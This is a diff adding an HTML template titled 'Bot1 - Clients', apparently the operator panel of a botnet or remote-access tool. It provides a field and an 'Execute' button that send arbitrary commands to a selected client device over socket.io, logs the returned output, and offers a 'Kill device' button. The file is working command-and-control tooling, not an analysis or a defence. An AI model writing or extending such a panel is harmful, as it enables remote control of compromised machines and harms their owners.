@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Bot1 - Clients</title>
+        <link rel="stylesheet" href="/static/styles.css" />
+    </head>
+    <body>
+        <input type="text" name="cmd" id="cmd" placeholder="Command" />
+        <button id="cmd-btn">Execute</button>
+        <br />
+        <button id="kill">Kill device</button>
+        <script
+            src="https://cdn.socket.io/4.6.0/socket.io.min.js"
+            integrity="sha384-c79GN5VsunZvi+Q/WObgk2in0CbZsHnjEqvFxC5DxHn9lTfNce2WW6h2pH6u/kF+"
+            crossorigin="anonymous"
+        ></script>
+        <script>
+            const socket = io("/portal");
+
+            document
+                .getElementById("cmd-btn")
+                .addEventListener("click", function () {
+                    socket.emit("exec-cmd", {
+                        command: document.getElementById("cmd").value,
+                        id: "{{ id }}",
+                    });
+                    document.getElementById("cmd").value = "";
+                });
+
+            socket.on("exec-cmd-resp", (data) => {
+                if (data.id != "{{ id }}") {
+                    return;
+                }
+                console.log("CMD result:\n" + data.output);
+            });
+
+            document
+                .getElementById("kill")
+                .addEventListener("click", function () {
+                    socket.emit("out", { type: "kill", id: "{{ id }}" });
+                    window.location.href = "/";
+                });
+        </script>
+    </body>
+</html>
